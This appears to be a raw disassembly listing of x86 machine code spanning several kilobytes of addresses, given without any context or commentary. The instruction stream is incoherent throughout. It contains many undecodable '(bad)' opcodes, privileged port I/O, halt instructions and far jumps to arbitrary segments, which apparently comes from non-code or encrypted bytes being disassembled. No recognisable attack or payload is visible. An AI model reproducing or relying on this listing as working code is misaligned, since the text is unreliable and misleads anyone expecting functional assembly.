  420265:	inc    ebx
  420266:	push   esi
  420267:	adc    eax,0x228773cb
  42026c:	pop    edi
  42026d:	addr16 xchg al,bh
  420270:	pop    edi
  420271:	mov    ds:0xa4fc8d1c,al
  420276:	pop    esp
  420277:	hlt    
  420278:	retf   
  420279:	pop    es
  42027a:	xchg   DWORD PTR [esi+0x54],eax
  42027d:	inc    esp
  42027e:	jb     0x42029a
  420280:	sbb    DWORD PTR [esi+edx*4+0x20],esi
  420284:	push   ss
  420285:	sbb    esi,DWORD PTR ds:0xe04353a1
  42028b:	test   BYTE PTR ds:0x4aac5a54,al
  420291:	(bad)  
  420292:	jl     0x420265
  420294:	rol    ebp,1
  420296:	fisttp WORD PTR [edi-0x69ca0aaa]
  42029c:	mov    ecx,0x81bfb2a9
  4202a1:	xlat   BYTE PTR ds:[ebx]
  4202a2:	retf   0x38e2
  4202a5:	je     0x420276
  4202a7:	mov    cl,0x49
  4202a9:	push   eax
  4202aa:	push   ecx
  4202ab:	xor    esi,DWORD PTR [ebp-0x6cf93c17]
  4202b1:	adc    al,0x23
  4202b3:	in     eax,dx
  4202b4:	mov    ds:0xac75493d,eax
  4202b9:	js     0x42024b
  4202bb:	ins    DWORD PTR es:[edi],dx
  4202bc:	je     0x4202a1
  4202be:	dec    DWORD PTR [esi-0x683ee968]
  4202c4:	lods   eax,DWORD PTR ds:[esi]
  4202c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4202c6:	push   ds
  4202c7:	mov    ds:0xb36ca542,eax
  4202cc:	inc    esp
  4202cd:	push   eax
  4202ce:	(bad)  
  4202cf:	aam    0xd5
  4202d1:	fisttp QWORD PTR [eax+0x7ca4ab91]
  4202d7:	push   ebp
  4202d8:	xlat   BYTE PTR ds:[ebx]
  4202da:	jmp    esp
  4202dc:	jnp    0x420350
  4202de:	sub    cl,BYTE PTR [ecx]
  4202e0:	add    BYTE PTR [edi+0x6d51cf96],cl
  4202e6:	xor    eax,0xf8e897ef
  4202eb:	nop
  4202ec:	rcl    edx,1
  4202ee:	add    DWORD PTR [edx-0x55c6245e],ecx
  4202f4:	popa   
  4202f5:	inc    eax
  4202f6:	ret    
  4202f7:	lock xlat BYTE PTR ds:[ebx]
  4202f9:	lock mul DWORD PTR [ebx]
  4202fc:	out    0x23,eax
  4202fe:	sbb    al,0x67
  420300:	call   0x89c:0xc8246f82
  420307:	sub    ebp,esp
  420309:	sar    BYTE PTR [edi+0x5d],cl
  42030c:	loopne 0x42032d
  42030e:	inc    edx
  42030f:	mov    es,edx
  420311:	pop    ds
  420312:	stos   DWORD PTR es:[edi],eax
  420313:	stc    
  420314:	out    0xc2,al
  420316:	in     al,0x48
  420318:	(bad)  
  420319:	pop    ds
  42031a:	scas   al,BYTE PTR es:[edi]
  42031b:	xor    ebx,DWORD PTR [ebx+0xb]
  42031e:	adc    BYTE PTR [edx+0x251b9166],dh
  420324:	jg     0x4202cf
  420326:	lea    edx,[edi-0xb]
  420329:	scas   al,BYTE PTR es:[edi]
  42032a:	xchg   ebp,eax
  42032b:	popf   
  42032c:	jbe    0x420389
  42032e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42032f:	rcr    DWORD PTR [edx+0x72],1
  420332:	fstp   QWORD PTR [edx]
  420334:	mov    dh,0x1c
  420336:	ins    DWORD PTR es:[edi],dx
  420337:	aas    
  420338:	lea    ebp,[bx+si-0x56]
  42033c:	ins    DWORD PTR es:[edi],dx
  42033d:	push   edi
  42033e:	lea    ebx,[ebp-0x332aac91]
  420344:	push   ds
  420345:	scas   al,BYTE PTR es:[edi]
  420346:	xchg   ebp,eax
  420347:	es stos BYTE PTR es:[edi],al
  420349:	mov    bl,0xcf
  42034b:	fnsave [ebp-0x42]
  42034e:	push   esp
  42034f:	cdq    
  420350:	pop    ebp
  420351:	aam    0x14
  420353:	clc    
  420354:	jecxz  0x4203d5
  420356:	je     0x4203b8
  420358:	pop    esp
  420359:	add    BYTE PTR [ebp-0x4b0ea418],dh
  42035f:	add    BYTE PTR [esi-0x57a2d914],cl
  420365:	mov    DWORD PTR [ebx+0x6ed3a02a],esi
  42036b:	or     ebp,DWORD PTR [edx]
  42036d:	xchg   DWORD PTR [ecx+edi*4+0x76],esp
  420371:	add    al,BYTE PTR [ebp-0x2f]
  420374:	addr16 mov ah,0x77
  420377:	out    0x8a,eax
  420379:	ret    
  42037a:	and    ecx,0xffffffe3
  42037d:	jl     0x420365
  42037f:	push   ecx
  420380:	dec    edx
  420381:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420382:	ret    
  420383:	pop    ds
  420384:	jg     0x4203e8
  420386:	dec    edx
  420387:	nop
  420388:	sahf   
  420389:	retf   0xf385
  42038c:	bound  esp,QWORD PTR [edx+0x368aa9e0]
  420392:	mov    DWORD PTR [ecx-0x6],ecx
  420395:	ja     0x420358
  420397:	iret   
  420398:	pop    ebp
  420399:	pop    esp
  42039a:	mov    edi,0x4eeff9a3
  42039f:	adc    eax,0x5e90f984
  4203a4:	scas   eax,DWORD PTR es:[edi]
  4203a5:	pop    ebp
  4203a6:	push   0xd6a7beeb
  4203ab:	mov    al,0x5c
  4203ad:	xor    BYTE PTR [eax-0xb],0x93
  4203b1:	pushf  
  4203b2:	mov    ah,0xf2
  4203b4:	mov    ah,0xd0
  4203b6:	jl     0x4203ad
  4203b8:	add    al,0x9f
  4203ba:	int3   
  4203bb:	push   ebx
  4203bc:	inc    edx
  4203bd:	sahf   
  4203be:	mov    dl,BYTE PTR [ecx+0x363b8522]
  4203c4:	popf   
  4203c5:	addr16 enter 0xcf56,0x58
  4203ca:	adc    ecx,edi
  4203cc:	push   ds
  4203cd:	xchg   ebp,eax
  4203ce:	xchg   ecx,eax
  4203cf:	cld    
  4203d0:	stos   DWORD PTR es:[edi],eax
  4203d1:	out    0xf3,eax
  4203d3:	mov    bl,0xad
  4203d5:	in     al,0x73
  4203d7:	push   DWORD PTR [ebx]
  4203d9:	pushf  
  4203da:	daa    
  4203db:	stos   WORD PTR es:[edi],ax
  4203dd:	sbb    eax,0x98efe5cf
  4203e2:	and    eax,0x9ae6e1ae
  4203e7:	mov    ds,WORD PTR [eax-0x1c46f108]
  4203ed:	inc    ecx
  4203ee:	call   0xd0930d57
  4203f3:	call   0x843b:0xf387d144
  4203fa:	pop    eax
  4203fb:	jae    0x42047b
  4203fd:	fadd   QWORD PTR [esi-0x3c]
  420400:	jmp    0x3bef1f08
  420405:	leave  
  420406:	jge    0x4203d2
  420408:	sbb    bh,dl
  42040a:	sub    BYTE PTR ds:0xfa29b21b,0xf2
  420411:	cmc    
  420412:	dec    eax
  420413:	std    
  420414:	pop    ebx
  420415:	inc    esp
  420416:	je     0x42040b
  420418:	inc    esi
  420419:	xchg   esp,eax
  42041a:	mov    eax,esp
  42041c:	add    ebx,DWORD PTR [edx+0x7e]
  42041f:	fsub   DWORD PTR [ecx+0x25cc4bc2]
  420425:	jbe    0x4203e4
  420427:	mov    ah,0x1f
  420429:	mov    ebp,0x8323e856
  42042e:	xchg   ebp,eax
  42042f:	xor    edx,DWORD PTR [esi-0x39]
  420432:	lea    ebx,[edi+0x7be74a76]
  420438:	js     0x420472
  42043a:	jne    0x4203db
  42043c:	cld    
  42043d:	xor    bl,al
  42043f:	jmp    0x42047b
  420441:	(bad)  
  420442:	aam    0xf2
  420444:	dec    ebx
  420445:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420446:	mov    ebp,0x1df9d9f6
  42044b:	(bad)  
  42044d:	push   ebp
  42044e:	inc    ebp
  42044f:	dec    edi
  420450:	or     DWORD PTR [ecx+0x12e2935a],0x3e
  420457:	popa   
  420458:	mov    al,ds:0xedc7381e
  42045d:	cmp    eax,edx
  42045f:	ja     0x420477
  420461:	xor    al,0xcf
  420463:	inc    edi
  420464:	add    esi,edx
  420466:	jmp    DWORD PTR [ecx]
  420468:	mov    es,WORD PTR [ebp-0x3b75aac0]
  42046e:	or     al,0x39
  420470:	push   ebp
  420471:	add    al,BYTE PTR [edi-0x3]
  420474:	sub    BYTE PTR [edi+0x6a],cl
  420477:	inc    esi
  420478:	dec    edx
  420479:	push   ecx
  42047a:	pop    edi
  42047b:	(bad)  
  42047c:	adc    al,0x5c
  42047e:	int    0x24
  420480:	test   BYTE PTR [ebp-0x66],al
  420483:	or     bh,BYTE PTR [edi]
  420485:	push   ebx
  420486:	cld    
  420487:	fs or  eax,0x60f31e52
  42048d:	(bad)  
  42048e:	ds xor al,0x1
  420491:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420492:	fsubr  DWORD PTR ss:[edi]
  420495:	mov    esp,0x5113c5ef
  42049a:	mov    edx,0xa525882f
  42049f:	cmp    esi,DWORD PTR [edi]
  4204a1:	fdivr  DWORD PTR [edi]
  4204a3:	fldenv [eax-0x6cd0857a]
  4204a9:	jp     0x420473
  4204ab:	js     0x420514
  4204ad:	push   es
  4204ae:	pop    ebx
  4204af:	rol    ecx,1
  4204b1:	imul   ebx,DWORD PTR [ecx-0xf],0xd
  4204b5:	enter  0x8fd0,0xef
  4204b9:	fdiv   DWORD PTR [edx+0x65]
  4204bc:	sbb    eax,0xcf7d6054
  4204c1:	mul    BYTE PTR [ecx]
  4204c3:	sbb    al,bh
  4204c5:	xor    al,0x13
  4204c7:	mov    ds:0xb773e0b9,eax
  4204cc:	arpl   WORD PTR [edx],cx
  4204ce:	nop
  4204cf:	pop    ebx
  4204d0:	outs   dx,BYTE PTR ds:[esi]
  4204d1:	push   edi
  4204d2:	cdq    
  4204d3:	idiv   esi
  4204d5:	retf   0x89be
  4204d8:	sub    esp,DWORD PTR [ecx+ebx*8+0x30]
  4204dc:	in     al,dx
  4204dd:	aam    0x2f
  4204df:	and    edi,0x9176ddc5
  4204e5:	sar    esi,0x1a
  4204e8:	test   DWORD PTR [edi-0xe87eb3b],ebx
  4204ee:	add    eax,0x23e1c3a8
  4204f3:	cmp    al,0x9f
  4204f5:	mov    BYTE PTR [ebp-0x47],cl
  4204f8:	(bad)
  4204fd:	xor    ecx,eax
  4204ff:	and    al,0x32
  420501:	inc    ebx
  420502:	lods   eax,DWORD PTR ds:[esi]
  420503:	inc    eax
  420504:	inc    eax
  420505:	mov    ah,0xd9
  420507:	mov    cl,BYTE PTR [ebp+ecx*8+0x5a]
  42050b:	mov    ebx,esi
  42050d:	(bad)  
  42050e:	xchg   esi,eax
  42050f:	mov    dh,0x90
  420511:	hlt    
  420512:	push   edx
  420513:	and    BYTE PTR [edx+0x61527579],ch
  420519:	mov    ah,0x95
  42051b:	test   eax,0x1bd9f2de
  420520:	aam    0xe2
  420522:	test   eax,0x4b9fb7a3
  420527:	sti    
  420528:	jp     0x420550
  42052a:	das    
  42052b:	shl    DWORD PTR [ebx],1
  42052d:	(bad)  
  42052e:	fild   QWORD PTR [esp+ebp*2]
  420531:	test   DWORD PTR [edx-0x68],eax
  420534:	jae    0x42057d
  420536:	mov    ecx,0x8d8b27ea
  42053b:	mov    ch,0x6
  42053d:	mov    dl,0x71
  42053f:	fwait
  420540:	cwde   
  420541:	xchg   ebx,eax
  420542:	mov    BYTE PTR [esi+ebp*1+0x73],dl
  420546:	fsubr  st(7),st
  420548:	inc    esi
  420549:	adc    BYTE PTR [esi+0x2c],bl
  42054c:	inc    eax
  42054d:	ss dec eax
  42054f:	xor    DWORD PTR [ebx-0x25451747],edx
  420555:	sahf   
  420556:	out    0x60,al
  420558:	sahf   
  420559:	push   esi
  42055a:	mov    eax,0x3336f0b
  42055f:	faddp  st(5),st
  420561:	push   edi
  420562:	ds dec esp
  420564:	sbb    DWORD PTR [edx+0x4362fd02],0x122ff4f6
  42056e:	call   esi
  420570:	push   ebp
  420571:	mov    cl,BYTE PTR [ecx]
  420573:	mov    eax,ds:0xec8738bf
  420578:	test   DWORD PTR [ecx+0x40892041],ecx
  42057e:	push   eax
  42057f:	test   esi,0x28925ae4
  420585:	sub    esi,DWORD PTR [edx-0x35033bbc]
  42058b:	jne    0x420552
  42058d:	lea    edx,[edx+0x45]
  420590:	ins    DWORD PTR es:[edi],dx
  420591:	xchg   esi,eax
  420592:	xchg   ebx,eax
  420593:	daa    
  420594:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  420596:	cs push esi
  420598:	imul   DWORD PTR [eax+0x4f]
  42059b:	mov    BYTE PTR [edi],dl
  42059d:	ficomp DWORD PTR [esi+0x3a]
  4205a0:	bound  esp,QWORD PTR [eax-0xb]
  4205a3:	frstor [eax-0x3b]
  4205a6:	loop   0x4205e5
  4205a8:	mov    dl,0x37
  4205aa:	sbb    BYTE PTR [edi-0x1e],cl
  4205ad:	xchg   BYTE PTR [edx],bl
  4205af:	fist   DWORD PTR [edx+0x6c8b64b1]
  4205b5:	jl     0x420620
  4205b7:	xchg   ecx,eax
  4205b8:	sti    
  4205b9:	mov    WORD PTR [eax],fs
  4205bb:	dec    ecx
  4205bc:	mov    ds:0x80c9fe29,eax
  4205c1:	rol    edi,0x2
  4205c4:	pop    es
  4205c5:	popf   
  4205c6:	and    BYTE PTR [ebx],ch
  4205c8:	(bad)  
  4205ca:	popa   
  4205cb:	xchg   edx,eax
  4205cc:	jno    0x4205ba
  4205ce:	out    dx,al
  4205cf:	xchg   ebp,eax
  4205d0:	mov    esi,ebp
  4205d2:	pop    ds
  4205d3:	aad    0x9b
  4205d5:	arpl   ax,si
  4205d7:	mov    ecx,0xe9fe0e60
  4205dc:	pushf  
  4205dd:	(bad)  
  4205de:	pop    edi
  4205df:	adc    eax,0xb38bb0b
  4205e4:	add    eax,0x6bbe1dc5
  4205e9:	or     BYTE PTR [edi],ch
  4205eb:	sub    BYTE PTR [ebp-0x6f70b9f8],ah
  4205f1:	push   ebx
  4205f2:	and    BYTE PTR [edi-0x54],bh
  4205f5:	xchg   dh,cl
  4205f7:	dec    esp
  4205f8:	push   es
  4205f9:	pop    edi
  4205fa:	xchg   esi,eax
  4205fb:	push   ecx
  4205fc:	cld    
  4205fd:	jle    0x420640
  4205ff:	push   esp
  420600:	cdq    
  420601:	cli    
  420602:	xor    al,0xfc
  420604:	xchg   DWORD PTR [eax],esp
  420606:	addr16 jmp 0x6ec8:0x179a8887
  42060e:	jnp    0x42062e
  420610:	sub    bh,BYTE PTR [esi]
  420612:	popf   
  420613:	cs sbb eax,0x1309ead8
  420619:	mov    dl,BYTE PTR [ebp+0x1a5c8766]
  42061f:	adc    bl,0x9d
  420622:	add    DWORD PTR [edx-0x3c],esi
  420625:	mov    dl,0x6f
  420627:	jecxz  0x420657
  420629:	sahf   
  42062a:	fcom   DWORD PTR [ecx]
  42062c:	enter  0xd0d,0xc2
  420630:	and    bh,cl
  420632:	push   0xffffffde
  420634:	jb     0x4206a7
  420636:	adc    BYTE PTR [ecx+ebp*2+0x76],bl
  42063a:	cmp    BYTE PTR [eax+edx*1+0x2178429f],dh
  420641:	jno    0x4206ab
  420643:	sbb    DWORD PTR [edi+0x6f4c64cc],ebx
  420649:	jge    0x420680
  42064b:	cmp    dh,BYTE PTR [eax]
  42064d:	jmp    0x420658
  42064f:	xlat   BYTE PTR ds:[ebx]
  420650:	lea    esp,[edi+esi*2-0x4e]
  420654:	xchg   edx,eax
  420655:	test   DWORD PTR [ecx],ebx
  420657:	dec    ebp
  420658:	xrelease mov DWORD PTR [eax],ecx
  42065b:	push   ds
  42065c:	hlt    
  42065d:	sub    ebx,DWORD PTR [edx+0xe121f75]
  420663:	fs xchg ebx,eax
  420665:	ja     0x42064c
  420667:	mov    ds:0xceaa2f7c,al
  42066c:	loop   0x42065c
  42066e:	pop    ds
  42066f:	xchg   esi,eax
  420670:	loop   0x4206da
  420672:	cmc    
  420673:	sbb    eax,0xcb662f7f
  420678:	sbb    al,0xe9
  42067a:	ret    
  42067b:	jle    0x4206c9
  42067d:	scas   al,BYTE PTR es:[edi]
  42067e:	xor    al,0x12
  420680:	jmp    0xa20e:0xfafca4b8
  420687:	loop   0x420664
  420689:	dec    ebp
  42068a:	inc    esp
  42068b:	mov    al,BYTE PTR [edi]
  42068d:	sbb    BYTE PTR [ebx-0x28c761ea],al
  420693:	enter  0x9502,0x16
  420697:	pop    ss
  420698:	xor    al,0x2e
  42069a:	in     eax,dx
  42069b:	or     al,0x94
  42069d:	js     0x4206a3
  42069f:	pop    edi
  4206a0:	or     cl,BYTE PTR [edx+0x71]
  4206a3:	(bad)  
  4206a4:	mov    ebx,0xdcb41102
  4206a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4206aa:	adc    ah,BYTE PTR [ebx+0xd7ee38b]
  4206b0:	xor    DWORD PTR [ebx-0x5b],eax
  4206b3:	mov    cl,0x84
  4206b5:	xchg   ebp,eax
  4206b6:	fs jl  0x4206c7
  4206b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4206ba:	inc    ebx
  4206bb:	inc    esp
  4206bc:	xor    esi,esi
  4206be:	xchg   ebp,eax
  4206bf:	and    dl,0x51
  4206c2:	jne    0x420660
  4206c4:	inc    ebp
  4206c5:	sbb    DWORD PTR [edx],eax
  4206c7:	xor    al,0x67
  4206c9:	sti    
  4206ca:	mov    bl,0x81
  4206cc:	pop    ebx
  4206cd:	xor    ah,BYTE PTR [edi-0x6a]
  4206d0:	pop    ebx
  4206d1:	sub    eax,0xbb8b6e1a
  4206d6:	push   edx
  4206d7:	xor    eax,0xe31298
  4206dc:	cmc    
  4206dd:	inc    edx
  4206de:	jecxz  0x420718
  4206e0:	jmp    0x48bc:0x8f3c1eff
  4206e7:	dec    esp
  4206e8:	sbb    ebp,ecx
  4206ea:	mov    cl,0x4a
  4206ec:	mov    ds:0x9e26bfe8,eax
  4206f1:	and    DWORD PTR [ecx+0x7e],ebp
  4206f4:	test   eax,0x2b9a7293
  4206f9:	inc    ebx
  4206fa:	and    DWORD PTR [ecx-0x638893fd],edx
  420700:	out    dx,al
  420701:	mov    BYTE PTR [edi+0x68],bl
  420704:	inc    esi
  420705:	fiadd  DWORD PTR [esp+edi*1-0x3299884b]
  42070c:	mov    eax,ds:0x5ecbc5b8
  420711:	ret    0x24f4
  420714:	retf   
  420715:	or     al,0xa4
  420717:	sti    
  420718:	cmp    al,0x67
  42071a:	jmp    0x6b39008d
  42071f:	mov    ebp,0xb3d40f4b
  420724:	dec    ebp
  420725:	mov    al,ds:0xd5f753cc
  42072a:	mov    ebx,0x3ed5e02c
  42072f:	mov    dh,0xe9
  420731:	jmp    0x42073d
  420733:	and    BYTE PTR [edx+edi*1-0x53c35a46],dh
  42073a:	add    ch,bh
  42073c:	jnp    0x420783
  42073e:	cli    
  42073f:	jl     0x42077f
  420741:	je     0x4207bf
  420743:	xor    BYTE PTR [esi],al
  420745:	push   es
  420746:	cmc    
  420747:	pop    ds
  420748:	gs (bad) 
  42074a:	outs   dx,BYTE PTR ds:[esi]
  42074b:	aad    0x86
  42074d:	scas   eax,DWORD PTR es:[edi]
  42074e:	mov    eax,ds:0x8003dc
  420753:	fst    QWORD PTR [edi-0x35]
  420756:	xlat   BYTE PTR ds:[ebx]
  420758:	push   ebp
  420759:	icebp  
  42075a:	xor    bh,bl
  42075c:	and    bh,ch
  42075e:	fnstcw WORD PTR [edi+edi*2+0x2c]
  420762:	outs   dx,DWORD PTR ds:[esi]
  420763:	jmp    0xb445:0xef1abdd9
  42076a:	cli    
  42076b:	pop    es
  42076c:	jne    0x420774
  42076e:	imul   ecx,DWORD PTR ds:0x6f1d08cb,0xffffffba
  420775:	mov    ds:0x5fc4bf45,al
  42077a:	pcmpgtw mm2,mm6
  42077d:	cdq    
  42077e:	jmp    0x42071e
  420780:	pusha  
  420781:	push   edi
  420782:	and    ebx,DWORD PTR [ecx+eax*1+0x1f]
  420786:	xchg   esi,eax
  420787:	jg     0x4207a8
  420789:	jmp    0x90f66762
  42078e:	and    BYTE PTR [ebp-0x18df6dc9],al
  420794:	in     al,dx
  420795:	sti    
  420796:	push   ebp
  420797:	repz leave 
  420799:	jae    0x420790
  42079b:	dec    edx
  42079c:	daa    
  42079d:	in     eax,0xef
  42079f:	push   edi
  4207a0:	int    0x28
  4207a2:	xor    DWORD PTR [edi-0x6c190acb],ebp
  4207a8:	mov    edx,ss
  4207aa:	xchg   edi,eax
  4207ab:	sar    BYTE PTR [ecx+ebx*8-0x13],cl
  4207af:	loop   0x42078c
  4207b1:	mov    ecx,0x59ffe19c
  4207b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4207b7:	in     al,dx
  4207b8:	mov    ch,0x29
  4207ba:	loop   0x420763
  4207bc:	stos   DWORD PTR es:[edi],eax
  4207bd:	or     al,0x5d
  4207bf:	das    
  4207c0:	in     eax,0xb1
  4207c2:	das    
  4207c3:	and    BYTE PTR [eax-0x58],dh
  4207c6:	inc    ecx
  4207c7:	xor    BYTE PTR [ecx],bh
  4207c9:	call   0x6715928c
  4207ce:	mov    edi,0x667d26cf
  4207d3:	inc    eax
  4207d4:	ds jmp 0xb009ffa4
  4207da:	and    ebp,DWORD PTR [ecx]
  4207dc:	dec    ebp
  4207dd:	xor    ax,0x846a
  4207e1:	repnz fcom st(6)
  4207e4:	xchg   ecx,eax
  4207e5:	addr16 inc edi
  4207e7:	loopne 0x4207ff
  4207e9:	adc    dh,BYTE PTR [ebx]
  4207eb:	adc    ecx,DWORD PTR [eax+0x1a25cfe9]
  4207f1:	je     0x42081f
  4207f3:	jbe    0x42081f
  4207f5:	mov    ecx,0xa1ed8a41
  4207fa:	stos   BYTE PTR es:[edi],al
  4207fb:	xchg   esp,eax
  4207fc:	jns    0x4207dd
  4207fe:	mov    ebx,0xecc1f3c0
  420803:	inc    eax
  420804:	rcl    DWORD PTR [ebx-0x6b23c194],1
  42080a:	cmp    eax,0x910516d6
  42080f:	mov    eax,ds:0x748108ab
  420814:	cmp    eax,0x48a45ba7
  420819:	pusha  
  42081a:	mov    esi,0x27e2e37c
  42081f:	inc    eax
  420820:	mov    eax,cs
  420822:	xor    eax,esi
  420824:	and    al,0x7f
  420826:	inc    ebp
  420827:	push   esi
  420828:	nop
  420829:	scas   ax,WORD PTR es:[edi]
  42082b:	sub    eax,DWORD PTR [ebx]
  42082d:	addr16 pop ecx
  42082f:	sbb    al,0x0
  420831:	nop
  420832:	rol    BYTE PTR [ecx-0x1ac59a7b],cl
  420838:	sbb    cl,BYTE PTR [ebp-0x47]
  42083b:	cwde   
  42083c:	sbb    eax,0x785c1e30
  420841:	xor    BYTE PTR ds:0x7b6c3233,ah
  420847:	js     0x420807
  420849:	or     eax,0x3cafd340
  42084e:	jg     0x4208b6
  420850:	inc    ecx
  420851:	push   0x6b74e9a0
  420856:	push   cs
  420857:	fild   WORD PTR [edi-0x15]
  42085a:	dec    esi
  42085b:	and    BYTE PTR es:[ebx+0x48],0x5f
  420860:	or     bl,BYTE PTR [edx-0x7]
  420863:	cmp    al,0xb6
  420865:	xchg   ecx,eax
  420866:	stos   BYTE PTR es:[edi],al
  420867:	in     eax,0xc5
  420869:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42086a:	xchg   BYTE PTR [ecx],ch
  42086c:	gs ret 
  42086e:	les    ecx,FWORD PTR [edx+0x58c117f0]
  420874:	adc    BYTE PTR [esi-0x18],bl
  420877:	cs stc 
  420879:	mov    ah,0xb6
  42087b:	xchg   esp,eax
  42087c:	fucompp 
  42087e:	dec    ecx
  42087f:	cld    
  420880:	jns    0x42083c
  420882:	add    ebx,0xe0264959
  420888:	jl     0x42085d
  42088a:	add    BYTE PTR [esi],bh
  42088c:	jb     0x42081a
  42088e:	aam    0xdc
  420890:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420891:	mov    al,ds:0x1065cbd7
  420896:	arpl   cx,bx
  420898:	mov    esp,0x12cd2480
  42089d:	scas   eax,DWORD PTR es:[edi]
  42089e:	(bad)  
  42089f:	mov    esp,0x476785f8
  4208a4:	loop   0x42083c
  4208a6:	dec    edx
  4208a7:	int    0x20
  4208a9:	nop
  4208aa:	lahf   
  4208ab:	jo     0x4208c9
  4208ad:	push   edx
  4208ae:	xchg   esp,eax
  4208af:	mov    WORD PTR [edx],fs
  4208b1:	das    
  4208b2:	push   ecx
  4208b3:	mov    cl,0x4a
  4208b5:	inc    ebx
  4208b6:	stc    
  4208b7:	bound  ebp,QWORD PTR [edx+0x50]
  4208ba:	sub    al,0x53
  4208bc:	(bad)  
  4208bd:	sub    DWORD PTR [eax+0x77],ecx
  4208c0:	jge    0x4208b9
  4208c2:	(bad)  
  4208c3:	xor    DWORD PTR [ebx+0x65],esp
  4208c6:	dec    ecx
  4208c7:	pop    esp
  4208c8:	repz inc edi
  4208ca:	in     al,dx
  4208cb:	loope  0x420852
  4208cd:	mov    edx,0x5fd0105d
  4208d2:	pop    edi
  4208d3:	je     0x4208e5
  4208d5:	cdq    
  4208d6:	or     eax,0x6dab4da9
  4208db:	dec    edx
  4208dc:	pop    ebp
  4208dd:	cdq    
  4208de:	jb     0x4208aa
  4208e0:	pop    esi
  4208e1:	xor    BYTE PTR [edx+edi*8-0x26d5c7e6],al
  4208e8:	mov    esp,0xbe6c356c
  4208ed:	ror    DWORD PTR [edx],0x3a
  4208f0:	data16 aaa 
  4208f2:	mov    DWORD PTR [edi],eax
  4208f4:	mov    ah,BYTE PTR [ecx+0xf183e49]
  4208fa:	or     eax,0xe1d32315
  4208ff:	outs   dx,BYTE PTR ds:[esi]
  420900:	push   ebx
  420901:	jnp    0x420956
  420903:	shl    DWORD PTR [eax],cl
  420905:	pop    ecx
  420906:	outs   dx,DWORD PTR ds:[esi]
  420907:	and    DWORD PTR [edx-0x1a86df3c],ebp
  42090d:	out    dx,al
  42090e:	pop    esi
  42090f:	jne    0x420912
  420911:	ins    DWORD PTR es:[edi],dx
  420912:	sbb    bh,dh
  420914:	jp     0x420951
  420916:	nop
  420917:	mov    edx,0x7fbb9516
  42091c:	inc    ebp
  42091d:	imul   ebx,ebp,0xffffff86
  420920:	ins    DWORD PTR es:[edi],dx
  420921:	push   cs
  420922:	cwde   
  420923:	mov    BYTE PTR [edx-0x7a],dl
  420926:	icebp  
  420927:	mov    bl,BYTE PTR [esi+0x51]
  42092a:	std    
  42092b:	sub    edx,esi
  42092d:	loopne 0x4208c1
  42092f:	cmp    al,BYTE PTR ds:0x67a205f2
  420935:	mov    al,0x1f
  420937:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420938:	retf   0x9e7f
  42093b:	cmp    bh,BYTE PTR [edx-0x2e828dad]
  420941:	lds    ebx,FWORD PTR [edi-0x59609d8a]
  420947:	bound  ecx,QWORD PTR [ebx+ebx*8-0x734209df]
  42094e:	jne    0x4208f0
  420950:	inc    ebx
  420951:	adc    edx,DWORD PTR [eax-0x1f]
  420954:	push   cs
  420955:	cvtps2pi mm7,QWORD PTR [ebp-0x11cd0377]
  42095c:	mov    ds:0xfb8863b2,eax
  420961:	imul   ebx,esp,0x6fe7e076
  420967:	pop    esp
  420968:	add    BYTE PTR [ebx+0x6],dh
  42096b:	stc    
  42096c:	in     eax,0xd
  42096e:	bound  cx,DWORD PTR [ebp-0x6463d0d0]
  420975:	mov    bl,0xe7
  420977:	or     al,0x87
  420979:	stos   DWORD PTR es:[edi],eax
  42097a:	and    eax,0xd876f36c
  42097f:	inc    ebp
  420980:	pop    ecx
  420981:	rcl    DWORD PTR [ebp+0x51],1
  420984:	clc    
  420985:	cld    
  420986:	jbe    0x4209c7
  420988:	and    BYTE PTR [eax+0x10c3be40],0x76
  42098f:	fistp  WORD PTR [ebp+0x1]
  420992:	jae    0x420987
  420994:	xchg   BYTE PTR [ecx],dl
  420996:	jae    0x42093f
  420998:	fnstsw WORD PTR [esi+esi*2+0x54ed2ad6]
  42099f:	fbstp  TBYTE PTR [edi]
  4209a1:	push   0x9e4ce5d1
  4209a6:	sub    DWORD PTR [edi-0x48],ebp
  4209a9:	lods   eax,DWORD PTR ds:[esi]
  4209aa:	cmp    BYTE PTR [eax-0x28],cl
  4209ad:	push   ss
  4209ae:	out    0xf6,eax
  4209b0:	stc    
  4209b1:	push   ebx
  4209b2:	fsubr  DWORD PTR [ebp-0xe3c72b0]
  4209b8:	clc    
  4209b9:	fiadd  WORD PTR [edi+0x3a]
  4209bc:	jbe    0x42099c
  4209be:	les    ecx,FWORD PTR [ecx+0xe]
  4209c1:	call   0x5cc14936
  4209c6:	fcomp  QWORD PTR [eax]
  4209c8:	jecxz  0x4209d3
  4209ca:	call   0x8f7:0x482308c3
  4209d1:	xchg   esi,eax
  4209d2:	adc    dh,BYTE PTR [ecx-0x44a74238]
  4209d8:	push   ecx
  4209d9:	adc    DWORD PTR [edi+0x27],0x973d6a73
  4209e0:	std    
  4209e1:	mov    ebp,0xcc27fa93
  4209e6:	pop    edi
  4209e7:	adc    bh,BYTE PTR ds:0xaad58f8d
  4209ed:	mov    al,0xb5
  4209ef:	test   ebx,esi
  4209f1:	mov    ds,WORD PTR [bx+si-0x97f]
  4209f6:	xchg   ebp,eax
  4209f7:	mov    esp,0xc877a141
  4209fc:	inc    eax
  4209fd:	xchg   DWORD PTR [esi],edi
  4209ff:	pop    es
  420a00:	pop    eax
  420a01:	or     ah,0x20
  420a04:	xchg   DWORD PTR [ebp+0x37774c82],ebx
  420a0a:	aad    0x46
  420a0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420a0d:	inc    ebp
  420a0e:	int    0xe0
  420a10:	jmp    0x420a79
  420a12:	and    ebx,0x25
  420a15:	or     al,0x88
  420a17:	push   edi
  420a18:	jp     0x420a6c
  420a1a:	cmp    DWORD PTR [ebp-0x29],edx
  420a1d:	iret   
  420a1e:	push   edx
  420a1f:	sbb    al,BYTE PTR [ebx]
